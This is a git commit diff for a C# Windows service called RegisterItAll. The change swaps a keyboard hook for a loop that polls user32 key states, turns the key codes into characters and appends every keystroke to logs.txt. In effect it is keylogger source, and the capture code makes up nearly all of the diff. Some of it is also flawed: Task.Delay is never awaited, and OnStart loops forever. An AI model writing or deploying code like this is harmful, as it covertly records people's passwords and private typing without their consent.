cc4c870ee7f5e8767b70fc8ca4d2d7effe496e84
Alejandro <alejandrocarrion1999@gmail.com>
2021-08-21 11:10:49 +0200

    Cambiar forma de detectar teclas pulsadas.

---
+++ RegisterItAll/Managers/KeystrokesCapturer.cs
@@ -0,0 +1,35 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace RegisterItAll.Managers
+{
+    public class KeystrokesCapturer
+    {
+        [DllImport("user32.dll")]
+        private static extern int GetAsyncKeyState(int key);
+
+        [DllImport("user32.dll")]
+        private static extern short GetAsyncKeyState(Keys key);
+
+        [DllImport("user32.dll")]
+        private static extern short GetKeyState(Keys key);
+
+        public static bool IsPressed(int key)
+        {
+            int keyState = GetAsyncKeyState(key);
+
+            return keyState == 32769;
+        }
+
+        public static bool IsAsyncPressed(Keys key)
+        {
+            return Convert.ToBoolean(GetAsyncKeyState(key));
+        }
+
+        public static bool IsPressed(Keys key)
+        {
+            return Convert.ToBoolean(GetKeyState(key));
+        }
+    }
+}
--- RegisterItAll/RegisterItAllService.cs
+++ RegisterItAll/RegisterItAllService.cs
@@ -1,7 +1,8 @@
-﻿using Gma.System.MouseKeyHook;
+﻿using RegisterItAll.Managers;
 using System;
 using System.IO;
 using System.ServiceProcess;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace RegisterItAll
@@ -19,18 +20,62 @@ namespace RegisterItAll
 
         protected override void OnStart(string[] args)
         {
-            IKeyboardMouseEvents hook = Hook.GlobalEvents();
+            while (true)
+            {
+                try
+                {
+                    for (int key = 0; key < 255; key++)
+                    {
+                        if (!KeystrokesCapturer.IsPressed(key))
+                        {
+                            continue;
+                        }
 
-            hook.KeyPress += OnKeyPressed;
+                        char? pressedKey = GetPressedKey(key);
 
-            Application.Run();
+                        if (pressedKey == null)
+                        {
+                            continue;
+                        }
+
+                        Console.WriteLine(pressedKey);
+                        File.AppendAllText("logs.txt", pressedKey.ToString());
+                    }
+                }
+                catch { }
+
+                Task.Delay(50);
+            }
         }
 
-        private static void OnKeyPressed(object sender, KeyPressEventArgs args)
+        private static char? GetPressedKey(int key)
         {
-            Console.WriteLine(args.KeyChar.ToString());
+            if (Keys.OemPeriod.Equals((Keys)key)) return '.';
+            else if (Keys.Space.Equals((Keys)key)) return ' ';
+            else if (Keys.D0.Equals((Keys)key) || Keys.NumPad0.Equals((Keys)key)) return '0';
+            else if (Keys.D1.Equals((Keys)key) || Keys.NumPad1.Equals((Keys)key)) return '1';
+            else if (Keys.D2.Equals((Keys)key) || Keys.NumPad2.Equals((Keys)key)) return '2';
+            else if (Keys.D3.Equals((Keys)key) || Keys.NumPad3.Equals((Keys)key)) return '3';
+            else if (Keys.D4.Equals((Keys)key) || Keys.NumPad4.Equals((Keys)key)) return '4';
+            else if (Keys.D5.Equals((Keys)key) || Keys.NumPad5.Equals((Keys)key)) return '5';
+            else if (Keys.D6.Equals((Keys)key) || Keys.NumPad6.Equals((Keys)key)) return '6';
+            else if (Keys.D7.Equals((Keys)key) || Keys.NumPad7.Equals((Keys)key)) return '7';
+            else if (Keys.D8.Equals((Keys)key) || Keys.NumPad8.Equals((Keys)key)) return '8';
+            else if (Keys.D9.Equals((Keys)key) || Keys.NumPad9.Equals((Keys)key)) return '9';
+            else if (Keys.LButton.Equals((Keys)key) || Keys.MButton.Equals((Keys)key)) return null;
 
-            File.AppendAllText("logs.txt", args.KeyChar.ToString());
+            if (key < 65 || key > 122)
+            {
+                return null;
+            }
+
+            if (KeystrokesCapturer.IsAsyncPressed(Keys.ShiftKey) && KeystrokesCapturer.IsPressed(Keys.CapsLock))
+                return Convert.ToChar(key + 32);
+            else if (KeystrokesCapturer.IsAsyncPressed(Keys.ShiftKey))
+                return Convert.ToChar(key);
+            else if (KeystrokesCapturer.IsPressed(Keys.CapsLock))
+                return Convert.ToChar(key);
+            else return Convert.ToChar(key + 32);
         }
     }
 }
